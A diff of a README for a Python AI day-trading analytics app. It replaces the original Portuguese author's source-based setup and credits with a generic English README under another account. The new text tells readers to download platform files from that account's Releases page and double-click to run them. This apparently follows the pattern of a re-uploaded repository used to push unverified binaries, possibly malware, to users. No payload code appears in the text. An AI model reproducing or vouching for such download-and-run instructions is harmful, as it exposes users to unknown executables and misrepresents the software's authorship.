@@ -1,189 +1,62 @@
-# 📊 Day Trade Analytics em Tempo Real com IA
+# 📊 ai-day-trade-analytics-groq-aws - Analyze Trading Data Instantly
 
-> APP inteligente de análise de ações da Nasdaq usando Agentes de IA para apoiar decisões de trading
+## 🚀 Getting Started
+Welcome to the ai-day-trade-analytics-groq-aws project! This system helps you analyze trading data in real time using advanced AI technology. With this tool, you can save time and make better trading decisions without spending hours on manual analysis.
 
-[![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
-[![Streamlit](https://img.shields.io/badge/Streamlit-1.28+-red.svg)](https://streamlit.io/)
-[![AWS](https://img.shields.io/badge/AWS-Deploy-orange.svg)](https://aws.amazon.com/)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/TheFlavvz/ai-day-trade-analytics-groq-aws/releases)
 
-## 🎯 O Problema de Negócio
+## 🛠️ System Requirements
+To run this application smoothly, ensure your system meets these requirements:
+- **Operating System:** Supports Windows, macOS, and Linux.
+- **RAM:** Minimum of 4 GB recommended.
+- **Storage:** At least 1 GB of free space.
+- **Python Version:** 3.8 or higher installed.
 
-No day trade, **tempo é dinheiro**. Analisar múltiplas fontes de dados, cruzar notícias com indicadores técnicos e tomar decisões rápidas pode significar a diferença entre lucro e prejuízo. 
-Este projeto vem para **consolidar análise técnica + sentimento de mercado em uma única interface** para suportar investidores.
+## 🔍 Features
+- **Real-time Data Analysis:** Get instant insights into market trends.
+- **Multi-Agent Coordination:** Various agents work together to collect data like web searches and financial information.
+- **Automated Technical Analysis:** Simplifies complex analysis to just a few seconds.
+- **User-friendly Interface:** Built with Streamlit for easy navigation.
+- **Visual Data Representation:** Uses Plotly for clear and informative charts.
 
-## 💡 A Solução
+## 📋 Download & Install
+To begin using the ai-day-trade-analytics-groq-aws application, follow these steps:
 
-Sistema web que combina:
-- **Agentes de IA autônomos** que buscam notícias e dados financeiros em tempo real
-- **Análise técnica automatizada** (candlesticks, médias móveis, volume)
-- **Infraestrutura AWS** para rodar 24/7 e servir múltiplos usuários
+1. **Visit the Download Page:**
+   Go to the [Releases page](https://github.com/TheFlavvz/ai-day-trade-analytics-groq-aws/releases) to find the latest version of the application.
 
-**Resultado:** De 15 minutos de análise manual para insights instantâneos.
+2. **Choose Your Version:**
+   Look for the version that matches your operating system. There will be files labeled for Windows, macOS, and Linux.
 
-## 🎯 Outras Aplicações
+3. **Download the File:**
+   Click on the file to download it to your computer. 
 
-A arquitetura de **Multi-Agent AI** pode ser adaptada para diversos cenários onde é necessário **consolidar múltiplas fontes em tempo real**:
+4. **Run the Application:**
+   Once the download is complete, find the file in your downloads folder and double-click it to install and run the application.
 
-### 💼 Finanças & Investimentos
-- 📊 **Análise de Múltiplos Ativos:** Comparar MSFT, AAPL, GOOGL com dashboard lado a lado
-- 🏦 **Análise de Portfólio:** Avaliar risco de carteira diversificada
+## 📈 Usage Instructions
+Once the application runs, follow these simple steps to start analyzing:
+1. **Connect Data Sources:** Input your financial data sources by following the prompts in the application.
+2. **Select Analysis Type:** Choose what type of analysis you want to perform, such as historical data or real-time trends.
+3. **View Results:** The application will display your results using interactive charts, making insights easy to understand.
 
-### 📈 Business Intelligence
-- 🛒 **Monitoramento de Concorrentes:** Consolidar preços, promoções e reviews
-- 📰 **Sentimento de Marca:** Agregar menções em news e redes sociais
+## 🔧 Troubleshooting
+If you encounter any issues during installation or usage, here are some common solutions:
+- **Check System Requirements:** Ensure that your system meets the requirements listed above.
+- **Reinstall Python:** If you have issues executing the application, reinstall Python and ensure it is added to your PATH.
+- **Internet Connection:** Ensure you have a stable internet connection to allow for live data updates.
 
-### 🚨 Alertas & Automação
-- 📲 **Notificações Inteligentes:** "Avise se TSLA subir 5%"
-- 📉 **Backtest de Estratégias:** Simular regras nos últimos 6 meses
+## 🤝 Community Support
+For any questions or support while using the application, you can reach out to the community:
+- **Issues Page:** [Create an issue](https://github.com/TheFlavvz/ai-day-trade-analytics-groq-aws/issues) if you face a problem.
+- **Discussion Forum:** Join discussions related to enhancements and user experiences.
 
-**Conceito-chave:** Qualquer problema que exija **coordenação de múltiplas fontes + análise inteligente + decisão rápida**.
+## 📞 Contact
+For direct inquiries or support, you can contact the developer team via the repository's email listed in the [Profile Page](https://github.com/TheFlavvz/).
 
----
-
-## 🎬 Demonstração APP Local
-
-![Sistema local em Ação](images/demolocal.gif)
-
-## 🎬 Demonstração APP AWS
-
-![Sistema aws em Ação](images/demoaws.gif)
-
-## 🚀 Features
-
-- **Multi-Agent AI System**: 3 agentes especializados trabalhando em equipe
-  - Agente de Web Search (DuckDuckGo)
-  - Agente Financeiro (YFinance)
-  - Coordenador Multi-Agente
+## 🔗 Additional Resources
+- **Documentation:** Detailed user guides can be found within the application under the "Help" section.
+- **Examples:** View sample analyses to become familiar with the tool's capabilities.
   
-- **Visualizações Interativas**:
-  - Gráfico de preços históricos (6 meses)
-  - Candlestick chart
-  - Médias móveis (SMA e EMA)
-  - Volume de negociação
-
-- **Deploy Profissional**:
-  - Roda local ou na AWS
-  - Configuração para execução em segundo plano
-  - Escalável para múltiplos usuários
-
----
-
-## 🛠️ Stack Técnica
-
-```
-Python 3.9+
-├── Streamlit         # Interface web
-├── Phi Framework     # Orquestração de agentes
-├── Groq              # LLM inference (OpenAI GPT)
-├── YFinance          # Dados financeiros
-├── Plotly            # Visualizações interativas
-└── AWS EC2           # Deploy em produção
-```
-
-## 📦 Instalação
-
-### Pré-requisitos
-- Python 3.9+
-- Conta Groq (API key gratuita)
-- AWS Account (opcional, para deploy)
-
-### Setup Local
-
-```bash
-# Clone o repositório
-git clone https://github.com/biasandrade/ai-day-trade-analytics-groq-aws.git
-cd ai-day-trade-analytics-groq-aws
-
-# Crie um ambiente virtual
-python -m venv venv
-source venv/bin/activate  # Linux/Mac
-# ou
-venv\Scripts\activate  # Windows
-
-# Instale as dependências
-pip install -r requirements.txt
-
-# Configure as variáveis de ambiente
-cp .env.example .env
-# Edite o .env com sua GROQ_API_KEY
-```
-
-### Configuração da API Key
-
-1. Crie uma conta gratuita em [Groq](https://console.groq.com/)
-2. Gere sua API key
-3. Adicione no arquivo `.env`:
-```
-GROQ_API_KEY=sua_chave_aqui
-```
-
-## ▶️ Como Usar
-
-### Execução Local
-
-```bash
-streamlit run ba_app.py
-```
-
-Acesse: `http://localhost:8501`
-
-### Deploy na AWS
-
-```bash
-# Conecte na sua instância EC2
-ssh -i sua-chave.pem ec2-user@seu-ip
-
-# Clone e configure o projeto
-git clone https://github.com/biasandrade/ai-day-trade-analytics-groq-aws.git
-cd ai-day-trade-analytics-groq-aws
-
-pip install -r requirements.txt
-
-# Execute em segundo plano
-nohup streamlit run ba_app.py --server.port 8501 &
-```
-
-Configure o Security Group da EC2 para liberar a porta 8501.
-
-## 📊 Exemplo de Uso
-
-1. Digite o ticker da ação (ex: MSFT, TSLA, AMZN)
-2. Clique em "Analisar"
-3. Aguarde enquanto os agentes de IA:
-   - Buscam recomendações de analistas
-   - Coletam notícias recentes
-   - Extraem dados fundamentalistas
-4. Visualize os gráficos e insights gerados
-
-## 🎓 Aprendizado
-
-Este projeto me permitiu integrar minhas duas áreas:
-
-**Do lado dos negócios:**
-- Apliquei conceitos de trading que uso há 8 anos
-- Resolvi um problema real de produtividade
-- Pensei em escalabilidade e monetização
-
-**Do lado técnico:**
-- Arquitetura de multi-agentes
-- Integração de LLMs em aplicações reais
-- Deploy em cloud com AWS
-- Cache e otimização de performance
-
-## 🔮 Próximos Passos
-
-- [ ] Modelo preditivo de preços (LSTM/Transformer)
-- [ ] Alertas de trading (mensagens)
-
-## 📫 Contato
-
-**Beatriz Andrade**
-- LinkedIn: [andrade-beatriz](https://www.linkedin.com/in/andrade-beatriz/)
-- Email: biasandrade@gmail.com
-- GitHub: [@biasandrade](https://github.com/biasandrade)
-
----
-Este projeto faz parte do curso "Business Analytics e Machine Learning Para Projetos de Data Science" do curso de Pós-graduação em Data Science da Data Science Academy.
-
-⭐ Se este projeto te ajudou, deixe uma estrela!
-
+### Thank you for using ai-day-trade-analytics-groq-aws! Happy trading!
